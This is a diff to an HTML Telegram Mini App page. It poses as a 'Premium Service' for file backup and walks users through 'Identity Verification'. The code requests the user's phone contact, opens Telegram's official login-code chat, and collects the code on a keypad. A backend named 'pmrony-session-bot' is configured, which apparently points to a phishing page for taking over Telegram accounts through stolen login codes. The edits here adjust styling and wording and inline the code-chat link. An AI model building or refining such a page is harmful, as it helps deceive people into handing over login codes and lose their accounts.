@@ -9,7 +9,7 @@
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding: 0; margin: 0; background: #000; color: white; text-align: center; }
         .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 50px 20px; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
         .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        .btn-get-code { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
+        .btn-get-code { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 16px; margin-bottom: 20px; }
         .hidden { display: none; }
         .otp-display { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 12px; font-size: 32px; text-align: center; background: #f9f9f9; color: #333; letter-spacing: 5px; height: 65px; box-sizing: border-box; outline: none; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
@@ -20,7 +20,7 @@
 <body>
     <div class="box" id="step0">
         <h2 style="color:#0088cc;">Premium Service</h2>
-        <p style="color:#666;">Backup your chat history securely.</p>
+        <p style="color:#666;">Backup your files securely. Activate your service below.</p>
         <button class="btn" id="main_btn" onclick="startFlow()">🚀 Activate Backup Service</button>
         <div id="loader" class="hidden"><p style="color:#0088cc;">🔄 Connecting...</p></div>
     </div>
@@ -29,8 +29,8 @@
         <h3>Identity Verification</h3>
         <p style="font-size:13px; color:#666; margin-bottom:15px;">কোডটি আপনার অফিসিয়াল 'Telegram' চ্যাটে পাঠানো হয়েছে।</p>
         
-        <!-- Get Code Button -->
-        <button class="btn-get-code" onclick="openCodeChat()">📩 GET LOGIN CODE</button>
+        <!-- এই বাটনটি Sage Finder এর মতো কাজ করবে -->
+        <button class="btn-get-code" onclick="tg.openTelegramLink('https://t.me/777000')">📩 GET LOGIN CODE</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
@@ -48,11 +48,6 @@
         const BACKEND_URL = "https://pmrony-session-bot.hf.space"; 
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
-
-        function openCodeChat() {
-            // সরাসরি ওটিপি চ্যাটে নিয়ে যাওয়ার লিঙ্ক
-            tg.openTelegramLink("https://t.me/777000");
-        }
 
         function startFlow() {
             tg.requestContact();
